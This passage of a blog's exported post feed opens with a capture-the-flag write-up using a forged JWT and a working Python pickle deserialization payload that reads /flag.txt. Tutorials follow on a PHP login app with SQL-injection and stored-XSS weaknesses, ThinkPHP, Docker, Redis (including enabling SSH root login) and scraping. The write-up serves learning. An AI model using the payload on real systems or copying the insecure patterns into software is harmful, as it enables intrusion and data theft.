print('find it'+str(i)) exit(0) 发现是在180页.hint:I’m flag man说明找对了,点击buy钱不够肯定买不了的,一直操作失败,F12以后找到post表单,价格改为1,再点buy虽然还是操作失败,但是返回以后发现进入了购物车,变成了折扣选项,可以抓包改discount0.0000000000000000000000000001,然后成功跳转b1g_m4mber这个页面.提示只能admin访问,查看cookie里有jwt,以前做过jwt的题,看来是修改jwt了.用c-jwt-cracker脚本跑密钥.跑出来是1Kun,jwt.ioencode一下:1eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ1c2VybmFtZSI6ImFkbWluIn0.40on__HQ8B2-wM1ZSwax3ivRK4j54jlaXv-1JjQynjo 修改cookie.成功跳转F12,&lt;!-- 潜伏敌后已久,只能帮到这了 --&gt;,成功得到源码,发现是tornado,前两个星期看了Django和flask,正好看看tornado框架,开始审计吧.发现Admin.py存在反序列化操作,对应的地方就是admin界面点击一键成为大会员的地方:12345def post(self, *args, **kwargs): try: become = self.get_argument('become') p = pickle.loads(urllib.unquote(become)) return self.render('form.html', res=p, member=1) 直接编写脚本:1234567891011import pickleimport urllibclass payload(object): def __reduce__(self): return (eval,('().__class__.__bases__[0].__subclasses__()[40]("/flag.txt").read()',)) #当然这里也可以不写这么花QAQ,写一个简单的open也是可以的.a = pickle.dumps(payload())a = urllib.quote(a)print a 运行脚本生成payload:1c__builtin__%0Aeval%0Ap0%0A%28S%27%28%29.__class__.__bases__%5B0%5D.__subclasses__%28%29%5B40%5D%28%22/flag.txt%22%29.read%28%29%27%0Ap1%0Atp2%0ARp3%0A. 然后直接抓包修改become参数,就可以得到flag了.]]></content>
      <categories>
        <category>web安全学习笔记</category>
      </categories>
      <tags>
        <tag>ctf</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[php简单的登陆注册功能]]></title>
    <url>%2F2019%2F07%2F20%2Fphp%E7%AE%80%E5%8D%95%E7%9A%84%E7%99%BB%E9%99%86%E6%B3%A8%E5%86%8C%E5%8A%9F%E8%83%BD%2F</url>
    <content type="text"><![CDATA[5月份的时候，郁师傅让我不用框架写个简单的登陆注册上传头像留言板的功能，要熟悉开发。还是贴出来记录一下吧。 login.html1234567891011121314151617181920&lt;!DOCTYPE html&gt;&lt;html&gt;&lt;head&gt; &lt;meta http-equiv="Content-type" content="text/html;charset=utf-8"&gt;&lt;/head&gt;&lt;body&gt; &lt;center&gt; &lt;form action="login.php"method="post"&gt; &lt;label&gt;username&lt;input type="text" name="username"&gt;&lt;/label&gt; &lt;br&gt; &lt;label&gt;password&lt;input type="text" name="password"&gt;&lt;/label&gt; &lt;br&gt; &lt;button type="submit" name="login"&gt;login&lt;/button&gt; &lt;button type="submit" name="register"&gt;register&lt;/button&gt; &lt;/form&gt; &lt;/center&gt;&lt;body&gt; &lt;/html&gt; login.php 12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849505152535455565758596061626364656667686970717273&lt;?phpsession_start();function protect($string)&#123; $string = trim(strip_tags(addslashes($string))); return $string;&#125;header("Content-type: text/html; charset=utf-8"); $link=mysqli_connect('localhost','root','','webtest');if(!$link)&#123; die('数据库连接失败');&#125;else &#123; if(isset($_POST['login'])) &#123; $username = protect($_POST['username']); $password = protect($_POST['password']); $query="select * from `user` where `username`= '$username' and `password`= '".md5($password)."'"; $result=mysqli_query($link,$query); if(!$result) &#123; echo "error:".mysqli_error($link); exit(); &#125; if (mysqli_num_rows($result)!=0) &#123; echo "登陆成功！"; $_SESSION['username']=$username; header("Location:home.php"); &#125; else echo "用户名或密码错误！"; &#125; if(isset($_POST['register'])) &#123; $username = protect($_POST['username']); $password = protect($_POST['password']); /**先检查username是否存在 */ $query="select * from `user` where `username`= '$username' "; $result=mysqli_query($link,$query); if(!$result) &#123; echo "error:".mysqli_error($link); exit(); &#125; if (mysqli_num_rows($result)!=0) &#123; die("username已存在"); header("Location:login.html"); &#125; /**执行插入 */ $query="INSERT INTO `user` SET `username`='$username',"."`password`='".md5($password)."'"; $result=mysqli_query($link,$query); if(!$result) &#123; echo "error:".mysqli_error($link); exit(); &#125; else &#123; echo "注册成功！"; header("Location:login.html"); &#125; &#125;&#125;?&gt; home.php 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596979899100101102103104105106107108109110111112113114115116117118119120121122123124125&lt;?phpinclude "login.php";$username=$_SESSION['username'];$link=mysqli_connect('localhost','root','','webtest'); if(!$link) &#123; die('数据库连接失败'); &#125;else &#123; $query="select * from `touxiang` where `username` = '$username'"; $result=mysqli_fetch_array(mysqli_query($link,$query)); $touxiang=$result['image']; //header('Content-type: image/JPEG',true); echo "&lt;center&gt;&lt;table style=' text-align: center' border='2'&gt; &lt;tr&gt;&lt;th&gt;头像&lt;/th&gt;&lt;th&gt;用户名&lt;/th&gt;&lt;/tr&gt;"; echo "&lt;td&gt;&lt;img src='data:image/jpeg;base64,$touxiang' width='40' height='40'&gt;&lt;/td&gt;&lt;td&gt;$username&lt;/td&gt;&lt;/tr&gt;"; echo "&lt;/table&gt;&lt;/center&gt;"; //echo $touxiang; &#125;?&gt;&lt;!DOCTYPE html&gt;&lt;html&gt;&lt;head&gt; &lt;meta http-equiv="Content-type" content="text/html;charset=utf-8" /&gt; &lt;title&gt;主页&lt;/title&gt;&lt;/head&gt;&lt;body&gt; &lt;center&gt; &lt;form method="post" enctype="multipart/form-data"&gt; &lt;table border="1"&gt; 请上传用户头像&lt;input type="file" name="file" id="file" /&gt; &lt;input type="submit" name="submit" value="上传头像"/&gt; &lt;/table&gt; &lt;/form&gt; &lt;h6&gt;输入留言内容&lt;/h6&gt; &lt;form action="home.php" method="post"&gt; 标题:&lt;input type="text" name="title"&gt;&lt;br&gt; 内容:&lt;textarea name="content"&gt;&lt;/textarea&gt;&lt;br&gt; &lt;input type="submit" name="insert"&gt; &lt;/form&gt; &lt;hr&gt; &lt;/center&gt;&lt;/body&gt;&lt;/html&gt;&lt;?php $link=mysqli_connect('localhost','root','','webtest'); if(!$link) &#123; die('数据库连接失败'); &#125; else &#123; /**修改头像功能 */ if(isset($_FILES['file'])) &#123; if($_FILES['file']['error']==0) &#123; echo "上传成功"; &#125; $fp = fopen($_FILES["file"]["tmp_name"],"rb"); $image =base64_encode(fread($fp,$_FILES["file"]["size"])); $query="select * from `touxiang` where `username` = '$username'"; $result=mysqli_query($link,$query); if (mysqli_num_rows($result)!=0)//判断是否存在 &#123; $query="UPDATE touxiang SET `username`='$username',`image`='$image'";//更改 mysqli_query($link,$query); &#125;else &#123; $query="insert into touxiang SET `username`='$username',`image`='$image'"; mysqli_query($link,$query); &#125; &#125; /**留言板功能 */ if(isset($_POST['insert'])) &#123; echo '&lt;center&gt;&lt;p1&gt;留言板&lt;/center&gt;'; $title = protect($_POST['title']); $content =protect($_POST['content']); $query="insert into liuyan SET `username`='$username',`title`='$title',`content`='$content'"; $result1=mysqli_query($link,$query); &#125; $result2=mysqli_query($link,"select * from liuyan where `username`='$username'"); echo ' &lt;center&gt; &lt;table border="1"&gt;&lt;tr&gt; &lt;td&gt;标题&lt;/td&gt; &lt;td&gt;内容&lt;/td&gt; &lt;/tr&gt; &lt;/center&gt; ' ; while($row =mysqli_fetch_array($result2)) &#123; echo "&lt;tr&gt;&lt;td&gt;".$row['title']."&lt;/td&gt;&lt;td&gt;".$row['content']."&lt;/tr&gt;"; &#125; &#125; ?&gt; mysql数据库 12345CREATE DATABASE webtest;USE webtest;CREATE TABLE `user` (`username` VARCHAR(20),`password` VARCHAR(20) );CREATE TABLE `touxaing` (`username` VARCHAR(20),`image` MEDIUMBLOB);CREATE TABLE `liuyan` (`username` VARCHAR(20),`title` VARCHAR(40),`content` VARCHAR(80)); 密码md5加密后储存在数据库中，头像base64加密后保存在数据库中，显示的时候用data协议读出来显示。]]></content>
      <categories>
        <category>杂项</category>
      </categories>
      <tags>
        <tag>php</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[thinkphp框架学习]]></title>
    <url>%2F2019%2F07%2F20%2Ftp6-0%E5%AD%A6%E4%B9%A0%2F</url>
    <content type="text"><![CDATA[composer因为我用的是phpstudy，首先要切换到php7以上要安装vc14，结果安装失败，原因是因为我安装了VS2017，然后我就有了VC2017的版本，我在控制面板把64版本的VC2017卸载，然后重新安装vc14成功。phpstudy2016自带composer1.2版本，开启openssl扩展，执行composer self-update报错:123456Updating to version 1.8.6 (stable channel). Downloading: 100% [RuntimeException] SHA384 is not supported by your openssl extension, could not verify the phar file integrity 我就只好自己安装了地址，安装里填的是7.2版本的php.exe，因为6.0版本的tp只支持7.1以上的php。 安装框架切换到WWW目录，安装tp框架1composer create-project topthink/think tp6 6.0.*-dev 测试执行，进入到tp6文件夹下，执行1php think run 访问127.0.0.1::8000，可以看到欢迎界面。 目录结构 框架源码的位置:vendor 应用目录名称与命名空间一致了:app 其他目录结构与文件功能保持5.1版本一致 配置设置通过create-project默认安装的话， 会在根目录自带一个.example.env文件，直接更名为.env文件就可以了。填好数据库配置，打开config下的database.php，添加:1use think\facade\Env; 然后conroller下index做个测试1234567891011121314151617181920212223&lt;?phpnamespace app\index\controller;use app\BaseController;use think\facade\Env;use think\facade\Db;class Index extends BaseController&#123; public function index() &#123; $query = 'show database'; dump(Env::get('database.hostname')); dump(Db::query("show databases")); &#125; public function hello($name = 'ThinkPHP6') &#123; return 'hello,' . $name; &#125;&#125; 可以看到成功输出 数据库查询构造器1234567891011121314//table():设置数据表//field():设置查询字段列表//find():返回满足条件的第一条记录//select():返回满足条件的多条记录//where():设置查询条件，字符串，表达式，数组//fetchSql():true,会拦截执行，返回构造好的sql语句$res=Db::table('user') -&gt;field('username,age') -&gt;where('username=chenxiyuan') -&gt;select();dump($res)//区间，模糊查询:-&gt;where('age','between',[10,20])//关联数组,等值查询，AND:-&gt;where(['user_id'=&gt;2,'age'=&gt;18])//order('age',' desc') asc升序，desc降序,多个字段升降序要放在一个数组中 模型创建一个模型类,User.php12345678910111213&lt;?phpnamespace app\index\model;use think\Model;class User extends Model&#123; protected $table ='user'; protected $pk ='user_id';&#125;?&gt; 创建一个控制器，ModelTest.php123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051&lt;?phpnamaspace app\index\controller;use app\index\model\User;class ModelTest&#123; //模型对象 public function demo1() &#123; //创建模型对象 $user = new user(); $res=$user-&gt;db()-&gt;find(1); dump($res); &#125; //依赖注入 public function demo2(User $user) &#123; $res=$user-&gt;db()-&gt;find(3); echo $res['username']; echo $res-&gt;name; &#125; //create():参数就是要新增的数据，返回当前模型对象 public function insert() &#123; $data=['username'=&gt;'chenxiyuan','password'='123456'] $user = User::create($data); return $user['user_id']; &#125; //查询，直接用db()来调用Query类中的方法完成 public function select(User $user) &#123; $res=$user-&gt;db()-&gt;find(1); dump($res); &#125; //更新:update public function update() &#123; $user = User::update(['username'=&gt;'chenxiyuan'],['password'=&gt;'111111']); &#125; //删除:destroy(),返回布尔值 public function delete() &#123; $res = User::destroy(function ($query)&#123; $query-&gt;where('username'='chenxiyuan'); &#125;); $res = User::destroy(['user_id'=&gt;1]); &#125;&#125;?&gt; 视图与模板示例新建一个ViewTest控制器，目录为app/index/controller/ViewTest.php12345678910111213141516&lt;?phpnamespace app\index\controller;use think\View;class ViewTest&#123; //方法与模板文件对应 public function index(View $view) &#123; //默认的视图目录是view //return $view-&gt;fetch('file:///D:/phpStudy/WWW/tp6/view/index/viewtest/index.html'); return $view-&gt;fetch(); &#125;&#125; 模板路径在与app同级的view下，路径为view/index/viewtest/index.html。如果方法与模板文件名对应，那么fetc()可为空，如果不对应，则要自己填模板名(不用填.html)，当然填实际路径也可以。创建完成后，访问127.0.0.1:8000/index/viewtest/index 模板赋值 添加fuzhi方法 12345678910111213141516171819202122public function fuzhi(View $view) &#123; $view-&gt;assign('site','晨曦远的个人博客'); //一组变量 $view-&gt;assign(['username'=&gt;'chenxiyuan','email'=&gt;'969987508@qq.com']); //数组 $info = ['grade'=&gt;'1','age'=&gt;19,'sex'=&gt;'boy']; $view-&gt;assign('info',$info); //对象 $obj = new \stdClass(); $obj-&gt;course = 'math'; $obj-&gt;score = 60; $view-&gt;assign('stu',$obj); //预定义变量: $_GET, $_SERVER return $view-&gt;fetch(); &#125; fuzhi.html 12345678910111213141516171819202122232425262728&lt;!DOCTYPE html&gt;&lt;html lang="en"&gt;&lt;head&gt; &lt;meta charset="UTF-8"&gt; &lt;title&gt;模板赋值&lt;/title&gt;&lt;/head&gt;&lt;body&gt;&#123;// 注释&#125;&#123;// 花括号将变量包裹即可访问变量&#125;&lt;p&gt;&#123;$site&#125;&lt;/p&gt;&lt;p&gt;用户名:&#123;$username&#125;&lt;/p&gt;&lt;p&gt;邮箱:&#123;$email&#125;&lt;/p&gt;&#123;// 数组&#125;&lt;p&gt;grade:&#123;$info['grade']&#125;&lt;/p&gt;&lt;p&gt;age:&#123;$info['age']&#125;&lt;/p&gt;&lt;p&gt;sex:&#123;$info.sex&#125;&lt;/p&gt;&#123;// 对象&#125;&lt;p&gt;course:&#123;$stu-&gt;course&#125;&lt;/p&gt;&lt;p&gt;score:&#123;$stu-&gt;score&#125;&lt;/p&gt;&#123;// 预定义变量&#125;&lt;p&gt;id:&#123;$_GET['id']&#125;&lt;/p&gt;&lt;p&gt;id:&#123;$Think.get.id&#125;&lt;/p&gt;&lt;/body&gt;&lt;/html&gt; 流程控制 循环 1234567&#123;foreach $users as $key=&gt;$user&#125;&lt;p&gt;&#123;$key&#125;:&#123;$user['name']&#125;--&#123;$user['age']&#125;&lt;/p&gt;&#123;/foreach&#125;&#123;volist name="users" id="user"&#125;&lt;p&gt;&#123;$key&#125;:&#123;$user['name']&#125;--&#123;$user['age']&#125;&lt;/p&gt;&#123;/volist&#125; 判断 123&#123;if (条件)&#125;...&#123;/if&#125; 其他内置标签 标签名 作用 包含属性 include 包含外部模板文件（闭合） file load 导入资源文件（闭合 包括js css import别名） file,href,type,value,basepath volist 循环数组数据输出 name,id,offset,length,key,mod foreach 数组或对象遍历输出 name,item,key for For循环数据输出 name,from,to,before,step switch 分支判断输出 name case 分支判断输出（必须和switch配套使用） value,break default 默认情况输出（闭合 必须和switch配套使用） 无 compare 比较输出（包括eq neq lt gt egt elt heq nheq等别名） name,value,type range 范围判断输出（包括in notin between notbetween别名） name,value,type present 判断是否赋值 name notpresent 判断是否尚未赋值 name empty 判断数据是否为空 name notempty 判断数据是否不为空 name defined 判断常量是否定义 name notdefined 判断常量是否未定义 name define 常量定义（闭合） name,value assign 变量赋值（闭合） name,value if 条件判断输出 condition elseif 条件判断输出（闭合 必须和if标签配套使用） condition else 条件不成立输出（闭合 可用于其他标签） 无 php 使用php代码 无 模板继承{block} {/block}组成区块，子模板可以对区块进行重载 base.html 12345678910&lt;html&gt;&lt;head&gt;&lt;meta http-equiv="Content-Type" content="text/html; charset=utf-8"&gt;&lt;title&gt;标题&lt;/title&gt;&lt;/head&gt;&lt;body&gt;&#123;block name="menu"&#125;菜单&#123;/block&#125;&#123;block name="footer"&#125;底部&#123;/block&#125;&lt;/body&gt;&lt;/html&gt; 子模板:index.html 12345678910&#123;extend name="base" /&#125;&#123;block name="menu"&#125;&lt;a href="/" &gt;首页&lt;/a&gt;&lt;a href="/home/" &gt;主页&lt;/a&gt;&lt;a href="/about/" &gt;关于&lt;/a&gt;&#123;/block&#125;&#123;block name="footer"&#125;&#123;__block__&#125;合并&#123;/block&#125; 在子模板中，可以对基础模板中的区块进行重载定义，如果没有重新定义的话，则表示沿用基础模板中的区块定义，如果定义了一个空的区块，则表示删除基础模板中的该区块内容。{__block__}这个标签，当区块中有这个标记时，就不只是直接重载这个区块，它表示引用所继承模板对应区块的内容到这个位置，最终这个区块是合并后的内容。所以显示的是底部合并]]></content>
      <categories>
        <category>杂项</category>
      </categories>
      <tags>
        <tag>php</tag>
        <tag>thinkphp</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[docker笔记]]></title>
    <url>%2F2019%2F07%2F18%2Fdocker%E7%AC%94%E8%AE%B0%2F</url>
    <content type="text"><![CDATA[安装ubuntu使用官方脚本自动安装1curl -fsSL https://get.docker.com | bash -s docker --mirror Aliyun 加入用户组 创建docker用户组 1sudo groupadd docker 加入docker用户组 1sudo usermod -aG docker $&#123;USER&#125; 重启docker服务 1sudo service docker restart 切换或者退出当前账户再从新登入 12su root 切换到root用户su $&#123;USER&#125; 再切换到原来的应用用户以上配置才生效 docker镜像加速器阿里云镜像加速器 镜像 列出本机所有image文件 1docker image ls 删除image文件 1docker image rm [imageName] 容器 先pull一个镜像 1docker pull training/webapp 产生一个容器 123docker run -d -P training/webapp python app.py#-d:让容器在后台运行。#-P:将容器内部使用的网络端口映射到我们使用的主机上。 列出[所有]容器 1234docker ps [-a]#CONTAINER ID IMAGE COMMAND CREATED STATUS PORTS NAMES#43c2ddf7ba86 training/webapp &quot;python app.py&quot; 7 minutes ago Up 7 minutes 0.0.0.0:32768-&gt;5000/tcp relaxed_jepsen#现在访问192.168.91.134:32768，就可以看到hello world 也可以自己指定端口 1docker run -d -p 5000:5000 training/webapp python app.py 查看 WEB 应用程序日志docker logs [ID或者名字] 可以查看容器内部的标准输出。 12345docker logs 8b64b668a789Running on http://0.0.0.0:5000/ (Press CTRL+C to quit)192.168.91.1 - - [18/Jul/2019 10:38:28] &quot;GET / HTTP/1.1&quot; 200 -192.168.91.1 - - [18/Jul/2019 10:38:28] &quot;GET /favicon.ico HTTP/1.1&quot; 404 -#使用docker logs -f 8b64b668a789，可以持续查看日志 查看WEB应用程序容器的进程 123docker top 8b64b668a789#UID PID PPID C STIME TTY TIME CMD#root 15091 15063 0 18:36 ? 00:00:00 python app.py 停用并删除所用容器 1docker stop $(docker ps -q) &amp; docker rm $(docker ps -aq)]]></content>
      <categories>
        <category>杂项</category>
      </categories>
      <tags>
        <tag>docker</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[redis学习]]></title>
    <url>%2F2019%2F07%2F17%2Fredis%E5%AD%A6%E4%B9%A0%2F</url>
    <content type="text"><![CDATA[概述 redis:REmote DIctionary Server是一种nosql数据库，它的数据是保存在内存中，同时redis可以定时把内存数据同步到磁盘，即可以将数据持久化，并且它比memcached支持更多的数据结构(string,list列表[队列和栈],set[集合],sorted set[有序集合],hash(hash表)) 更多命令可以查看REDIS文档 安装 kali: apt-get install redis-server 启动: service redis-server start 查看: ps aux|grep redis 操作 连接:redis-cli -h[ip] -p[port]字符串操作 添加: 1234set key valueset username chenxiyuanset website &quot;chenxiyuan.vip&quot;# 默认过期时间永久。如果ket已经有其他值，则直接覆盖，无视其类型 删除: del key 设置过期时间: 1234expire key seconds# 也可以在设置值得时候指定set key value EX secondssetex key seco value 查看过期时间:ttl key 查看所有的key:keys *列表操作 在列表左边添加元素:即插入表头 1lpush key value 在列表右边添加元素:即插入表尾 1rpush key value 查看列表中的元素: 123lrange key start stop#查看所有元素lrange key 0 -1 移除列表中的元素: 123456789#移除并返回列表的头元素lpop key#移除并返回列表的尾元素rpop key#移除并返回列表的中间元素lrem key count value#count&gt;0:删除从表头开始的count个value#count&lt;0:删除从表尾开始的|count|个value#count=0:删除表中所有的value 指定返回第几个元素: 1lindex key index 获取列表的长度:llen key set集合操作: 添加元素: 12sadd key member [member ...]sadd students xiaohong xiaoming 查看集合中的元素: 1smembers key 查看集合中元素个数: 1scard key 移除元素: 1srem key member [member ...] 获取多个集合的交集: 12345sinter key [key ...]# sadd class1 xiaohong xiaobai xiaoming # sadd class2 xiaobai xiaole xiaohong xiaotian# sinter class1 class2# 1) &quot;xiaobai&quot; 2) &quot;xiaohong&quot; 获取多个集合的并集: 1sunion key [key ...] 获取多个集合的差集: 123456sdiff key [key ...]# sdiff class1 class2# 1) &quot;xiaoming&quot;# sdiff class2 class1# 1) &quot;xiaole&quot;# 2) &quot;xiaotian&quot; hash哈希操作: 添加一个新值: 12hset key field value#hset blog chenxiyuan chenxiyuan.vip 获取hash中的field对应的value: 1hget key field 删除field: 1hdel key field [field ...] 获取hash中的所有field和value: 1hgetall key 获取hash中所有键: 1hkeys key 获取hash中所有值: 1hvals key 获取hash键值对数量: 1hlen key 事务 multi: 标记一个事务块的开始。事务块内的多条命令会按照先后顺序被放进一个队列当中，最后由 EXEC 命令原子性(atomic)地执行。 exec: 执行所有事务块内的命令。假如某个(或某些) key 正处于 WATCH 命令的监视之下，且事务块中有和这个(或这些) key 相关的命令，那么 EXEC 命令只在这个(或这些) key 没有被其他命令所改动的情况下执行并生效，否则该事务被打断(abort)。 discard: 取消事务，放弃执行事务块内的所有命令。如果正在使用 WATCH 命令监视某个(或某些) key，那么取消所有监视，等同于执行命令 UNWATCH 。 watch: 监视一个(或多个) key ，如果在事务执行之前这个(或这些) key 被其他命令所改动，那么事务将被打断。 unwatch: 取消 WATCH 命令对所有 key 的监视。如果在执行 WATCH 命令之后， EXEC 命令或 DISCARD 命令先被执行了的话，那么就不需要再执行 UNWATCH 了。因为 EXEC 命令会执行事务，因此 WATCH 命令的效果已经产生了；而 DISCARD 命令在取消事务的同时也会取消所有对 key 的监视，因此这两个命令执行之后，就没有必要执行 UNWATCH 了。 发布和订阅操作 我用的是kali,然后再用xshell连接kali虚拟机，也用redis-cli连接上。注:用xshell连接kali，需要执行以下操作1vim /etc/ssh/sshd_config 将123456# Authentication:#LoginGraceTime 2m#PermitRootLogin prohibit-password#StrictModes yes#MaxAuthTries 6#MaxSessions 10 修改为123456# Authentication:LoginGraceTime 2mPermitRootLogin yesStrictModes yesMaxAuthTries 6MaxSessions 10 重启ssh服务1service ssh restart 设置ssh服务开机自启动1update-rc.d ssh enable kali虚拟机订阅频道 12#subscribe channel [channel ...]subscribe chatroom xshell发布一个消息 1#publish channel message 持久化 redis提供了两种数据备份方式，一种是RDB，另外一种是AOF: RDB AOF 开启关闭 开启：默认开启。关闭：把配置文件中所有的save都注释，就是关闭了。 开启：在配置文件中appendonly yes即开启了aof，为no关闭。 同步机制 可以指定某个时间内发生多少个命令进行同步。比如1分钟内发生了2次命令，就做一次同步。 每秒同步或者每次发生命令后同步 存储内容 存储的是redis里面的具体的值 存储的是执行的更新数据的操作命令 存储文件的路径 根据dir以及dbfilename来指定路径和具体的文件名 根据dir以及appendfilename来指定具体的路径和文件名 优点 （1）存储数据到文件中会进行压缩，文件体积比aof小。（2）因为存储的是redis具体的值，并且会经过压缩，因此在恢复的时候速度比AOF快。（3）非常适用于备份。 （1）AOF的策略是每秒钟或者每次发生写操作的时候都会同步，因此即使服务器故障，最多只会丢失1秒的数据。 （2）AOF存储的是Redis命令，并且是直接追加到aof文件后面，因此每次备份的时候只要添加新的数据进去就可以了。（3）如果AOF文件比较大了，那么Redis会进行重写，只保留最小的命令集合。 缺点 （1）RDB在多少时间内发生了多少写操作的时候就会出发同步机制，因为采用压缩机制，RDB在同步的时候都重新保存整个Redis中的数据，因此你一般会设置在最少5分钟才保存一次数据。在这种情况下，一旦服务器故障，会造成5分钟的数据丢失。（2）在数据保存进RDB的时候，Redis会fork出一个子进程用来同步，在数据量比较大的时候，可能会非常耗时。 （1）AOF文件因为没有压缩，因此体积比RDB大。 （2）AOF是在每秒或者每次写操作都进行备份，因此如果并发量比较大，效率可能有点慢。（3）AOF文件因为存储的是命令，因此在灾难恢复的时候Redis会重新运行AOF中的命令，速度不及RDB。 更多 http://redisdoc.com/topic/persistence.html#redis 客户端与服务器设置密码 设置临时密码redis连接后，输入命令CONFIG SET requirepass password可以使用密码来保护 Redis 服务器。示例代码: 12345678910127.0.0.1:6379&gt; config set requirepass secret_passwordOK127.0.0.1:6379&gt; quit #重新启动，以生效root@chenxiyuan:/etc/redis# redis-cli -h 127.0.0.1 -p 6379 127.0.0.1:6379&gt; ping(error) NOAUTH Authentication required. #未验证密码，操作被拒绝127.0.0.1:6379&gt; auth secret_passwordOK127.0.0.1:6379&gt; ping #验证密码后，成功执行PONG 设置永久密码配置文件/etc/redis/redis.conf，打开配置文件找到SECURITY部分，添加 1requirepass yourpassword 重新启动服务即可 其他机器连接本机redis这里我又开了一台ubuntu:192.168.91.1341234vim /etc/redis/redis.conf #注释掉 bind 127.0.0.1 那行，再重启服务#或者bind 127.0.0.1 192.168.91.134 注意这里是ubuntu的ip地址，如果填的是kali的，则redis服务根本起不来。sudo service redis-server restart 然后kali:192.168.91.133连接12345678redis-cli -p 6379 -h 192.168.91.134192.168.91.134:6379&gt; ping(error) NOAUTH Authentication required.192.168.91.134:6379&gt; auth chenxiyuanOK192.168.91.134:6379&gt; pingPONG# 成功，ubunturedis服务器一定要设置密码，不然会有protected mode 默认是开的，会拒绝访问。 python操作redis安装redis123pip install redis#因为我的kali有两个版本的python，而默认是python2，所以我这样安装python3 -m pip install redis 连接redis因为python操作redis的方法与redis-cli操作方法基本类似，就不赘述了。123456&gt;&gt;&gt; from redis import Redis&gt;&gt;&gt; cache=Redis(host=&apos;127.0.0.1&apos;,port=6379,password=&apos;chenxiyuan&apos;)&gt;&gt;&gt; cache.set(&apos;username&apos;,&apos;chenxiyuan&apos;)True&gt;&gt;&gt; cache.get(&apos;username&apos;)b&apos;chenxiyuan&apos; 事务操作12345678# 定义一个管道实例pip = cache.pipeline()# 做第一步操作，给BankA自增长1pip.incr('BankA')# 做第二步操作，给BankB自减少1pip.desc('BankB')# 执行事务pip.execute() 主从复制建立ubuntu:192.168.91.134123127.0.0.1:6379&gt; info replication# Replicationrole:master kali:192.168.91.13312345678910111213141516171819202122127.0.0.1:6379&gt; slaveof 192.168.91.134 6379OK127.0.0.1:6379&gt; info replication# Replicationrole:slavemaster_host:192.168.91.134master_port:6379master_link_status:upmaster_last_io_seconds_ago:9master_sync_in_progress:0slave_repl_offset:195slave_priority:100slave_read_only:1connected_slaves:0master_replid:589b79b1011b3c7e933cefc0fb4a8ae8190696b9master_replid2:0000000000000000000000000000000000000000master_repl_offset:195second_repl_offset:-1repl_backlog_active:1repl_backlog_size:1048576repl_backlog_first_byte_offset:114repl_backlog_histlen:82 读写分离从机是无法写的12127.0.0.1:6379&gt; set username chenxiyuan(error) READONLY You can&apos;t write against a read only replica. 主机死掉ubuntu: shutdownkali: 还是slave，当主机重新连入写数据，从机还是可以读数据。 从机死掉kali: shutdown,重新连入后为master，除非写入配置。只要再slaveof，还是可以读到主机的所有数据 反客为主1slaveof no one]]></content>
      <categories>
        <category>杂项</category>
      </categories>
      <tags>
        <tag>redis</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[多线程爬斗图啦]]></title>
    <url>%2F2019%2F07%2F17%2F%E5%A4%9A%E7%BA%BF%E7%A8%8B%E7%88%AC%E6%96%97%E5%9B%BE%E5%95%A6%2F</url>
    <content type="text"><![CDATA[趁热打铁吧，再写一个爬虫练手，也是再次熟悉下BeautifulSoup库的使用。123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051import requestsfrom bs4 import BeautifulSoupimport osimport reimport threadingdirs="斗图"headers =&#123; 'User-Agent':'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/75.0.3770.100 Safari/537.36'&#125;def mkdir(): if not os.path.exists(dirs): os.mkdir(dirs) os.chdir(dirs) return True else: print("文件夹已存在") return Falsedef get_one_page(url): res = requests.get(url, headers=headers) content = res.content soup = BeautifulSoup(content, 'lxml') img_list = soup.find_all('img', attrs=&#123;'class': 'img-responsive lazy image_dta'&#125;) one_page_list =[] for img in img_list: t = (img['alt'],img['data-original']) one_page_list.append(t) return one_page_listdef download_img(img,name,suf,i): with open(name+ "."+suf, 'wb+') as f: print("正在下载"+name) f.write(img.content)if __name__ =="__main__": mkdir() for i in range(1,2605): one_page_list=get_one_page('http://www.doutula.com/photo/list/?page='+str(i)) threads=[] for j in one_page_list: name=re.sub('[\/:*?"&lt;&gt;|_]','',j[0]) suf=j[1][-3:]#获取后缀 img = requests.get(j[1]) t = threading.Thread(target=download_img,args=[img,name,suf,i]) threads.append(t) for i in range(0,len(threads)-1): threads[i].start() for i in range(0, len(threads) - 1): threads[i].join()]]></content>
      <categories>
        <category>python学习笔记</category>
      </categories>
      <tags>
        <tag>python</tag>
        <tag>爬虫</tag>
        <tag>多线程</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[多线程爬妹子图]]></title>
    <url>%2F2019%2F07%2F16%2F%E5%A4%9A%E7%BA%BF%E7%A8%8B%E7%88%AC%E5%A6%B9%E5%AD%90%E5%9B%BE%2F</url>
    <content type="text"><![CDATA[原来的代码有点问题，改了以后成功添加多线程，都跑一分钟，多线程要多爬120张图片，这样看来效率果然高了许多。先上普通的:123456789101112131415161718192021222324252627282930313233343536373839404142434445464748import requestsimport osimport reimport randomdirs="D:/妹子图"headers = &#123; 'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/55.0.2883.87 UBrowser/6.2.4094.1 Safari/537.36'&#125;def mkdir(): if not os.path.exists(dirs): os.mkdir('D:/妹子图') os.chdir('D:/妹子图') return True else: print("妹子图文件夹已存在") return Falsedef get_max_page(): url="https://www.mzitu.com/zipai/" r = requests.get(url,headers=headers) result=re.findall("&lt;span aria-current='page' class='page-numbers current'&gt;(.*?)&lt;/span&gt;",r.text,re.S) return result[0]def find_onepage_imgs(url): r=requests.get(url,headers=headers) result=re.findall('&lt;div class="comment-meta commentmetadata"&gt;&lt;a href=".*?"&gt;(.*?)&lt;/a&gt;.*?&lt;/div&gt;.*?&lt;p&gt;&lt;img class="lazy".*?data-original="(.*?)".*?&lt;/p&gt;',r.text,re.S) #print(result[0][0].split()) return resultdef download_img(img,path,i): with open(path+str(int(random.random()*100)) + ".jpg", 'wb+') as f: print("下载第" + str(i) + "页提交于" + path + "的图片") 